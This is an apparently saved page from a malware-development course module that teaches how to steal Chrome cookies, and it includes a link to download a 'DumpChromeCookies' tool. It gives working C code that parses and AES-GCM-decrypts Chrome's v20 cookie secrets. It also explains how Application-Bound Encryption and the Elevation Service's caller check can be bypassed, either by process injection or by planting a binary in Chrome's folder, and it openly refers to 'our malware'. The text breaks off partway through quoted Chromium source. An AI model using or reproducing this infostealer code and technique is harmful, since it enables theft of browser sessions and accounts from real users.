    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="81_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="81_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="81_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="81_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="81_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/DumpChromeCookies" target="_blank">
                    <img src="81_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">

    
    


    
    

    
    <div id="module-content" class="transition-opacity duration-300 opacity-100">
        <h2 id="toc-heading-0">Dumping Browser Cookies: Chrome</h2>
<h3 id="toc-heading-1">Introduction</h3>
<p>In the previous two modules we focused on Mozilla Firefox and showed 
how to retrieve sensitive data such as cookies and saved logins. This 
module shifts focus to Google Chrome, the most widely used browser. 
Well examine how Chrome stores user data and the protections it 
applies, and then develop a tool to export cookies and bookmarks similar
 to the one from the Firefox modules.</p>
<blockquote>
<p>This module uses Chrome 141.0.7390.54 Release (September 30, 2025).</p>
</blockquote>
<h3 id="toc-heading-2">Cookie Storage</h3>
<p>Like Firefox, Chrome stores cookies on disk using an SQLite database, located at <code>%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies</code>.
 Chrome encrypts sensitive data like cookies and saved logins using 
AES-256-GCM, and stores them in a structure we will refer to as a <em>Chrome secret</em>.
 A Chrome secret comprises both encrypted data and the metadata required
 to decrypt it. Therefore, in order to decrypt cookies, we must 
understand this structure.</p>
<p>A Chrome secret begins with a tag signifying the version of the secret. As of this module, the latest version is <code>v20</code>.
 This is followed by a 12-byte AES-GCM nonce, the encrypted data and a 
16-byte authentication tag. The AES-GCM cipher uses this tag to verify 
that the data has not been tampered with. We will refer to the AES-GCM 
key used for encryption as the <em>app-bound</em> key, which will be discussed more in-depth later in this module.</p>
<img src="81_files/ChromeSecret.png" style="margin:auto" width="1000px">
<br>
<h4 id="toc-heading-3">The PrintChromeSecret Function</h4>
<p>With this information fresh in mind, let us construct a function that
 decrypts a Chrome secret and prints it to the console. The <code>PrintChromeSecret</code> function does exactly that, and it takes in three parameters:</p>
<ul>
<li>
<p><code>AppBoundKey</code> - The AES-256-GCM key used when encrypting the data of the secret.</p>
</li>
<li>
<p><code>Data</code> - A buffer containing a Chrome secret.</p>
</li>
<li>
<p><code>DataSize</code> - The size of the <code>Data</code> buffer.</p>
</li>
</ul>
<p>First, we verify that the secret's version is <code>v20</code>, as 
expected. Next, we parse the structure to extract the AES-GCM tag and 
nonce. Then, we determine the size of the encrypted data by subtracting 
the size of the version header, the tag and the nonce from the total 
size of the secret. Finally, we use the <code>Aes256GcmDecrypt</code> helper function (explained later) to decrypt the data. We then print the data to the console with the <code>Cookie:</code> prefix, as this is the only type of secret we are interested in for this scenario.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">CONST CHAR SecretVersion<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token char">'v'</span><span class="token punctuation">,</span> <span class="token char">'2'</span><span class="token punctuation">,</span> <span class="token char">'0'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

VOID <span class="token function">PrintChromeSecret</span><span class="token punctuation">(</span>_In_ PUCHAR AppBoundKey<span class="token punctuation">,</span> _In_ PUCHAR Data<span class="token punctuation">,</span> _In_ ULONG DataSize<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    PUCHAR Ciphertext<span class="token punctuation">;</span>
    ULONG  CiphertextLength<span class="token punctuation">;</span>
    PUCHAR Nonce<span class="token punctuation">;</span> <span class="token comment">// The nonce is 12 bytes</span>
    PUCHAR Tag<span class="token punctuation">;</span>   <span class="token comment">// The tag is 16 bytes</span>

    <span class="token comment">//</span>
    <span class="token comment">// Validate the version</span>
    <span class="token comment">//</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>Data<span class="token punctuation">,</span> SecretVersion<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>SecretVersion<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Unsupported Chrome version\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Get the nonce</span>
    <span class="token comment">//</span>

    Nonce <span class="token operator">=</span> Data <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>SecretVersion<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Get the authentication tag, which is the last 16 bytes</span>
    <span class="token comment">//</span>

    Tag <span class="token operator">=</span> Data <span class="token operator">+</span> DataSize <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// The ciphertext is between the nonce and the tag</span>
    <span class="token comment">//</span>

    Ciphertext       <span class="token operator">=</span> Data <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>SecretVersion<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">;</span>
    CiphertextLength <span class="token operator">=</span> DataSize <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>SecretVersion<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Decrypt the ciphertext using AES-256-GCM with the app-bound key</span>
    <span class="token comment">//</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Aes256GcmDecrypt</span><span class="token punctuation">(</span>AppBoundKey<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> Nonce<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> Tag<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> Ciphertext<span class="token punctuation">,</span> CiphertextLength<span class="token punctuation">)</span> <span class="token operator">==</span> TRUE<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
		<span class="token comment">//</span>
		<span class="token comment">// The value of the cookie starts after the first 32 bytes</span>
		<span class="token comment">//</span>

        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"- Cookie: %.*hS\n\n"</span><span class="token punctuation">,</span> CiphertextLength <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">,</span> Ciphertext <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-4">The Aes256GcmDecrypt Helper Function</h4>
<p>The <code>Aes256GcmDecrypt</code> function uses the BCrypt API to AES-256-GCM decrypt a memory buffer in place. It takes 8 parameters:</p>
<ul>
<li>
<p><code>Key</code>- The AES key to be used.</p>
</li>
<li>
<p><code>KeySize</code> - The size of the <code>Key</code> buffer.</p>
</li>
<li>
<p><code>Nonce</code>- The AES nonce to be used.</p>
</li>
<li>
<p><code>NonceSize</code>- The size of the nonce buffer.</p>
</li>
<li>
<p><code>Tag</code>- The authentication tag generated during encryption.
 It is used by the algorithm to verify that the ciphertext has not been 
altered and that the decrypted plaintext is authentic.</p>
</li>
<li>
<p><code>TagSize</code> - The size of the tag buffer.</p>
</li>
<li>
<p><code>Ciphertext</code> - The buffer which is to be decrypted.</p>
</li>
<li>
<p><code>CiphtertextSize</code> - The size of the <code>Ciphertext</code> buffer.</p>
</li>
</ul>
<p>First, the function uses <code>BCryptOpenAlgorithmProvider</code> to open a handle to the AES algorithm provider. The algorithm provider uses AES-CBC by default, so we must set it to GCM using <code>BCryptSetProperty</code> with the <code>BCRYPT_CHAIN_MODE_GCM</code> flag. Next, the AES key is imported into the function using <code>BCryptImportKey</code>. As AES-GCM is an authenticated cipher, the authentication mode must also be configured to use the given tag. Finally, we call <code>BCryptDecrypt</code> to decrypt the data in place.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOLEAN <span class="token function">Aes256GcmDecrypt</span><span class="token punctuation">(</span>_In_ PUCHAR Key<span class="token punctuation">,</span> _In_ ULONG KeySize<span class="token punctuation">,</span> _In_ PUCHAR Nonce<span class="token punctuation">,</span> _In_ ULONG NonceSize<span class="token punctuation">,</span> _In_ PUCHAR Tag<span class="token punctuation">,</span> _In_ ULONG TagSize<span class="token punctuation">,</span> _Inout_ PUCHAR Ciphertext<span class="token punctuation">,</span> _Inout_ ULONG CiphertextLength<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO CipherInfo<span class="token punctuation">;</span>
    BCRYPT_ALG_HANDLE                     AlgorithmHandle<span class="token punctuation">;</span>
    BCRYPT_KEY_HANDLE                     KeyHandle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    UCHAR                                 Buffer<span class="token punctuation">[</span>AES_KEY_BLOB_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    BCRYPT_KEY_DATA_BLOB_HEADER<span class="token operator">*</span>          KeyBlob<span class="token punctuation">;</span>
    ULONG                                 PlaintextSize<span class="token punctuation">;</span>
    NTSTATUS                              Status<span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Open the AES algorithm provider</span>
    <span class="token comment">//</span>

    Status <span class="token operator">=</span> <span class="token function">BCryptOpenAlgorithmProvider</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>AlgorithmHandle<span class="token punctuation">,</span> BCRYPT_AES_ALGORITHM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">BCRYPT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open a handle on the AES algorithm provider: 0x%08lX\n"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">do</span>
    <span class="token punctuation">{</span>
        <span class="token comment">//</span>
        <span class="token comment">// Set it to GCM mode</span>
        <span class="token comment">//</span>

        Status <span class="token operator">=</span> <span class="token function">BCryptSetProperty</span><span class="token punctuation">(</span>AlgorithmHandle<span class="token punctuation">,</span> BCRYPT_CHAINING_MODE<span class="token punctuation">,</span> <span class="token punctuation">(</span>PUCHAR<span class="token punctuation">)</span>BCRYPT_CHAIN_MODE_GCM<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BCRYPT_CHAIN_MODE_GCM<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">BCRYPT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//</span>
        <span class="token comment">// Import the AES key</span>
        <span class="token comment">//</span>

        KeyBlob <span class="token operator">=</span> <span class="token punctuation">(</span>BCRYPT_KEY_DATA_BLOB_HEADER<span class="token operator">*</span><span class="token punctuation">)</span>Buffer<span class="token punctuation">;</span>
        KeyBlob<span class="token operator">-&gt;</span>dwMagic <span class="token operator">=</span> BCRYPT_KEY_DATA_BLOB_MAGIC<span class="token punctuation">;</span>
        KeyBlob<span class="token operator">-&gt;</span>dwVersion <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        KeyBlob<span class="token operator">-&gt;</span>cbKeyData <span class="token operator">=</span> KeySize<span class="token punctuation">;</span>

        <span class="token function">RtlCopyMemory</span><span class="token punctuation">(</span>Buffer <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BCRYPT_KEY_DATA_BLOB_HEADER<span class="token punctuation">)</span><span class="token punctuation">,</span> Key<span class="token punctuation">,</span> KeySize<span class="token punctuation">)</span><span class="token punctuation">;</span>

        Status <span class="token operator">=</span> <span class="token function">BCryptImportKey</span><span class="token punctuation">(</span>AlgorithmHandle<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> BCRYPT_KEY_DATA_BLOB<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyHandle<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">BCRYPT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not import AES key: 0x%08lX\n"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
		
		<span class="token comment">//</span>
		<span class="token comment">// Configure the authentication mode</span>
		<span class="token comment">// </span>
		
        <span class="token function">BCRYPT_INIT_AUTH_MODE_INFO</span><span class="token punctuation">(</span>CipherInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
        CipherInfo<span class="token punctuation">.</span>pbNonce <span class="token operator">=</span> Nonce<span class="token punctuation">;</span>
        CipherInfo<span class="token punctuation">.</span>cbNonce <span class="token operator">=</span> NonceSize<span class="token punctuation">;</span>
        CipherInfo<span class="token punctuation">.</span>pbTag <span class="token operator">=</span> Tag<span class="token punctuation">;</span>
        CipherInfo<span class="token punctuation">.</span>cbTag <span class="token operator">=</span> TagSize<span class="token punctuation">;</span>

        <span class="token comment">//</span>
        <span class="token comment">// Decrypt the ciphertext</span>
        <span class="token comment">//</span>

        Status <span class="token operator">=</span> <span class="token function">BCryptDecrypt</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">,</span> Ciphertext<span class="token punctuation">,</span> CiphertextLength<span class="token punctuation">,</span> <span class="token operator">&amp;</span>CipherInfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> Ciphertext<span class="token punctuation">,</span> CiphertextLength<span class="token punctuation">,</span> <span class="token operator">&amp;</span>CiphertextLength<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">BCRYPT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not decrypt the ciphertext: 0x%08lX\n"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>KeyHandle <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">BCryptDestroyKey</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">BCryptCloseAlgorithmProvider</span><span class="token punctuation">(</span>AlgorithmHandle<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">BCRYPT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Now that we know where Chrome stores secrets and how they are 
protected, the only other information needed to decrypt Chrome's cookies
 is the app-bound key. This key is stored in the <code>%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State</code> JSON file, and it's encrypted using Chrome's <em>Application-Bound Encryption</em> mechanism.</p>
<h3 id="toc-heading-5">Application-Bound Encryption</h3>
<p>Before version 127, Chrome secured the app-bound key using the <em>Data Protection API</em>
 (DPAPI). The DPAPI is a collection of functions that provide 
operating-system-level data protection services to applications. Its 
purpose is to let applications protect data without needing to implement
 their own cryptographic code. Chrome used the <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata" target="_blank">CryptProtectData</a> function from DPAPI to encrypt the app-bound key before storing it in the <code>Local State</code> file.</p>
<p>Data encrypted this way can only be decrypted by the same user using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata" target="_blank">CryptUnprotectData</a>
 function. Therefore, to decrypt the app-bound key you must be running 
as the same user who ran Chrome. Usually this was not a problem because 
our malware ran under the same user account that uses Chrome. In the 
rare cases when it did not, we could impersonate the access token of the
 <code>chrome.exe</code> process.</p>
<p>However, because this protection was easy for information stealers 
(also known as infostealers) to bypass, Google enhanced the security of 
the app-bound key in Chrome version 127 by implementing 
Application-Bound Encryption. Now, instead of being linked to the user, 
the encrypted data is bound to the Chrome application itself. This means
 that, in theory, only the Chrome executable located at <code>C:\Program Files\Google\Chrome\Application\</code> can decrypt and access the app-bound key. At this point, two possibilities of accessing the app-bound key may come to mind:</p>
<ol>
<li>
<p>Performing remote process injection into <code>chrome.exe</code>.</p>
</li>
<li>
<p>Writing a binary in the <code>C:\Program Files\Google\Chrome\Application\</code> folder and running it.</p>
</li>
</ol>
<p>These are the approaches that the Google security team intended to 
coerce malware authors into. Indeed, the purpose of application-bound 
encryption is not to prevent the app-bound key from being accessed by 
malware but rather to make the process as noisy as possible, in the hope
 of triggering a response from anti-malware solutions. In the first 
scenario, remote process injection is performed, which is heavily 
monitored and scrutinized. The other scenario requires admin privileges 
and involves writing a binary to disk.</p>
<h4 id="toc-heading-6">Chrome Elevation Service</h4>
<p>In Chrome, app-bound encryption depends on a privileged service called the <em>Chrome Elevation Service</em>, which runs in the context of the <code>NT AUTHORITY\SYSTEM</code>
 account. This Elevation Service hosts an RPC server that handles the 
encryption and decryption of the app-bound key on behalf of Chrome. When
 Chrome needs to decrypt the app-bound key, it must make an RPC call to 
this service. However, as mentioned above, the elevation service 
validates the identity of the RPC client and only permits Google Chrome 
to perform this action. Since Google Chrome is based on the Chromium 
browser, which is open-source, we can examine the part of the elevation 
service's source code that handles caller validation.</p>
<p>Caller validation is performed by the <code>ValidatePath</code> function. First, it retrieves the full name of the caller's process using the <code>GetProcessExecutablePath</code> function, which calls the <code>QueryFullProcessImageNameW</code> WinAPI. It then calls its own <code>GeneratePathValidationData</code> function, which uses the helper function <code>MaybeTrimProcessPath</code>
 to trim the EXE part from the process path. The trimmed path is then 
matched against the Chrome installation directory. Examining this source
 code helps us to understand why the two possible workarounds discussed 
above work.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">//</span>
<span class="token comment">// Source: https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/caller_validation.cc</span>
<span class="token comment">//</span>

<span class="token comment">// Paths look like this: "C:\Program Files\Blah\app.exe".</span>
<span class="token comment">// This function will remove the final EXE, then it will remove paths that match</span>
<span class="token comment">// 'Temp', 'Application' or a version pattern if they are the final directory.</span>
<span class="token comment">//</span>
<span class="token comment">// Examples:</span>
<span class="token comment">// "C:\Program Files\Blah\app.exe" -&gt;</span>
<span class="token comment">// "C:\Program Files\Blah"</span>
<span class="token comment">//</span>
<span class="token comment">// "C:\Program Files\Blah\app2.exe" -&gt;</span>
<span class="token comment">// "C:\Program Files\Blah"</span>
<span class="token comment">//</span>
<span class="token comment">// "C:\Program Files\Blah\Temp\app.exe" -&gt;</span>
<span class="token comment">// "C:\Program Files\Blah"</span>
<span class="token comment">//</span>
<span class="token comment">// "C:\Program Files\Blah\Application\app.exe" -&gt;</span>
<span class="token comment">// "C:\Program Files\Blah"</span>
<span class="token comment">//</span>
<span class="token comment">// "C:\Program Files (x86)\Blah\Application\app.exe" -&gt;</span>
<span class="token comment">// "C:\Program Files\Blah"</span>
<span class="token comment">//</span>
<span class="token comment">// "C:\Program Files (x86)\Blah\Application\1.2.3.4\app.exe" -&gt;</span>
<span class="token comment">// "C:\Program Files\Blah"</span>
<span class="token comment">//</span>
base<span class="token operator">::</span>FilePath <span class="token function">MaybeTrimProcessPath</span><span class="token punctuation">(</span><span class="token keyword">const</span> base<span class="token operator">::</span>FilePath<span class="token operator">&amp;</span> full_path<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">auto</span> components <span class="token operator">=</span> full_path<span class="token punctuation">.</span><span class="token function">GetComponents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span>std<span class="token operator">::</span>wstring<span class="token operator">&gt;</span> trimmed_components<span class="token punctuation">;</span>

  <span class="token class-name">size_t</span> token <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> components<span class="token punctuation">.</span><span class="token function">crbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> components<span class="token punctuation">.</span><span class="token function">crend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>it<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    token<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span>
        base<span class="token operator">::</span><span class="token function">EndsWith</span><span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">,</span> L<span class="token string">".exe"</span><span class="token punctuation">,</span> base<span class="token operator">::</span>CompareCase<span class="token operator">::</span>INSENSITIVE_ASCII<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>base<span class="token operator">::</span><span class="token function">EqualsCaseInsensitiveASCII</span><span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">,</span> <span class="token string">"Temp"</span><span class="token punctuation">)</span> <span class="token operator">||</span>
                       base<span class="token operator">::</span><span class="token function">EqualsCaseInsensitiveASCII</span><span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">,</span> <span class="token string">"Application"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> it<span class="token operator">-&gt;</span><span class="token function">starts_with</span><span class="token punctuation">(</span>L<span class="token string">"scoped_dir"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      token<span class="token operator">--</span><span class="token punctuation">;</span>
      <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> base<span class="token operator">::</span><span class="token function">Version</span><span class="token punctuation">(</span>base<span class="token operator">::</span><span class="token function">WideToASCII</span><span class="token punctuation">(</span>it<span class="token operator">-&gt;</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">IsValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      token<span class="token operator">--</span><span class="token punctuation">;</span>
      <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>base<span class="token operator">::</span><span class="token function">EqualsCaseInsensitiveASCII</span><span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">,</span> L<span class="token string">"Program Files (x86)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      trimmed_components<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>L<span class="token string">"Program Files"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    trimmed_components<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  base<span class="token operator">::</span>FilePath trimmed_path<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> trimmed_components<span class="token punctuation">.</span><span class="token function">crbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> trimmed_components<span class="token punctuation">.</span><span class="token function">crend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token operator">++</span>it<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    trimmed_path <span class="token operator">=</span> trimmed_path<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> trimmed_path<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate path based validation data, or return empty string if this was not</span>
<span class="token comment">// possible.</span>
base<span class="token operator">::</span>expected<span class="token operator">&lt;</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token class-name">uint8_t</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> HRESULT<span class="token operator">&gt;</span> <span class="token function">GeneratePathValidationData</span><span class="token punctuation">(</span>
    <span class="token keyword">const</span> base<span class="token operator">::</span>FilePath<span class="token operator">&amp;</span> process_path<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>process_path<span class="token punctuation">.</span><span class="token function">IsNetwork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> base<span class="token operator">::</span><span class="token function">unexpected</span><span class="token punctuation">(</span>
        elevation_service<span class="token operator">::</span>Elevator<span class="token operator">::</span>kErrorUnsupportedFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// Wide to narrow data loss is fine here, because the same system will always</span>
  <span class="token comment">// be dealing with the same data.</span>
